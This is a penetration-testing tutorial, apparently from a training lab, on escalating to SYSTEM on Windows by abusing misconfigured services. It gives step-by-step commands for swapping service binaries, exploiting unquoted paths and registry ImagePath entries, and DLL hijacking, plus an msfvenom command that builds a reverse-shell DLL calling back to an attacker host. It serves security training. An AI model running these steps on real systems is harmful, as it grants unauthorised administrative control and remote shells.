# Windows Service Exploitation

* Most simple example (edit config)
* Unquoted service paths
* Weak Registry Permissions for Service
* Insecure Service Executable permissions
* DLL Hijacking

List running services:
```default
net start
sc query
```

List all services (including not running):
```default
sc query type= service state= all
```

Check write access on all Windows services (also check your irregular user groups):
```default
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
```

## Most simple example

**Scenario:** We have discovered a vulnerable (modifiable) service with winPEAS called `daclsvc`.

```default
C:\> whoami
whoami
somedomain\user
```

Use the sysinternals tool accesschk to see the access permissions of that service ACL (access control list). You need to use an old version of accesschk that still allows the /accepteula parameter flag to avoid a GUI prompt.

```default
.\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

```

Required for exploitation is some way to change the service and a way to start the service.

We can:

* SERVICE_CHANGE_CONFIG
* SERVICE_START
* SERVICE_STOP

We can change the service config and (re)start the service, which means we should be able to exploit it.


Query the current service configuration:

```default
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE                : 10 WIN32_OWN_PROCESS
        START_TYPE          : 3 DEMAND_START
        ERROR_CONTROL       : 1 NORMAL
        BINARY_PATH_NAME    : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP    :
        TAG                 : 0
        DISPLAY_NAME        : DACL Service
        DEPENDENCIES        : 
        SERVICE_START_NAME  : LocalSystem
```

3 DEMAND_START means it needs to be started manually

LocalSystem indicates that it should be run with the permissions of the SYSTEM user.

BINARY_PATH_NAME is the binary that will be executed.


Check the current state of the service:

```default
sc query daclsvc

SERVICE_NAME: daclsvc
        TYPE                : 10 WIN32_OWN_PROCESS
        STATE               : 1 STOPPED
        WIN32_EXIT_CODE     : 1077 (0x435)
        SERVICE_EXIT_CODE   : 0 (0x0)
        CHECKPOINT          : 0x0
        WAIT_HINT           : 0x0
```

The service is currently stopped.


Change the BINARY_PATH_NAME to the path of a reverse shell binary (e.g. created by msfvenom).

```default
sc config daclsvc binpath= "\"C:\PrivEsc\serverse.exe\""
[SC] ChangeServiceConfig SUCCESS
```

Confirm that the path is correct and then start the service:
```default
net start daclsvc
```

Your listener should receive the reverse shell then.

You might have to deal with dependencies, i.e. other services that need to be started. This could offer different problems or exploitation paths e.g. if you can edit one service, but only start another, etc.



## Unquoted service paths

If the binary path of a service is not quoted ("") and there are spaces in the path (e.g. C:\Program Files\), then path ambiguities arise that could be exploited.

Let's say we have the following binary path:

```default
C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe
```

Then the service program will try the following possibilities in order:

* C:\Program.exe
* C:\Program Files\A.exe
* C:\Program Files\A Subfolder\B.exe
* C:\Program Files\A Subfolder\B Subfolder\C.exe
* C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

Now let's say we have write permissions in `C:\Program Files\A Subfolder\`, then we can just create a binary B.exe in that directory and it will be executed by the service instead of the intended binary SomeExecutable.exe.


You can use the sysinternals tool accesschk to test each directory in the path.


```default
.\accesschk.exe /accepteula -uwdq C:\
```

```default
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
```
```default
.\accesschk.exe /accepteula -uwdq "C:\Program Files\A Subfolder\"
```

etc.

If you get a result like:
```default
RW BUILTIN\Users
```

or 
```default
RW Everyone
```

Then you will be able to create the binary in that directory. The current user might also be in some other group that fits, so make sure to compare those.


After creating the B.exe reverse shell binary, just start the affected service.

```default
net start unquotedsvc
```



## Weak Registry Permissions for Service

Even though we might not be allowed to edit the config of a service, we might be able to edit the registry entry for that same service.

E.g. we might be able to edit the registry entry:

```default
HKLM\system\currentcontrolset\services\regsvc
```

even though we are not allowed to edit the config of service regsvc

```default
.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc

    Medium Mandatory Level (Default) [No-Write-Up]
    RW AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
    RW BUILTIN\Administrators
        KEY_ALL_ACCESS
    RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```

NT AUTHORITY\INTERACTIVE is a pseudo group for all users that are allowed to log in. Which we happen to be one of.

Query the registry entry:

```default
reg query HKLM\system\currentcontrolset\services\regsvc
```

There should be a field like "ImagePath" that has the path to the binary, similar to the "binpath" in the service config.

Overwrite the registry entry:
```default
reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Then just start the service

```default
net start regsvc
```

Your binary should get executed.


## Insecure Service Executable permissions

Another possibility is that the binary that is set as binpath in the service config is not sufficiently protected. I.e. you might be able to just overwrite the binary at the original location, without having to edit the service in any way.

It is a good idea to make a backup of the original service binary.

Start the service and you are gold.


## DLL Hijacking

Detecting this vulnerabilty takes manual work. Only bother checking services that you can start and stop. And obviously only check services with higher privileges (e.g. LocalSystem)

Windows will check the PATH for DLLs (libraries). If a service uses a DLL which is missing, then we might be able to inject our own DLL instead, by writing to a location included on the PATH. For example if the TEMP directory C:\Temp\ (%TEMP%) is included on the PATH, then we might have an easy game, since %TEMP% tends to be world writable.

You will need to copy the service binary to a machine you control for analysis.


### Figure out used dlls

Use sysinternals ProcMon (procmon64.exe) on a Windows machine you control. Clear the output and create a filter "Process Name" - "is" - "thecopiedservice.exe"

Deselect "Show Registry activity" and "Show Network Activity". 

Start the capture.

If you are on a different machine, then recreate the service with the copied binary.

Start the service with:

```default
net start dllsvc
```

In ProcMon look at the "NAME NOT FOUND" errors.

They will show you which dll's are looked for and in which directories in order.

If you can insert your malicious dll in one of those locations that are checked before the correct location, then you have won.


Generate a dll reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f dll -o hackedlib.dll
```

Place the dll with the correct filename in the correct location.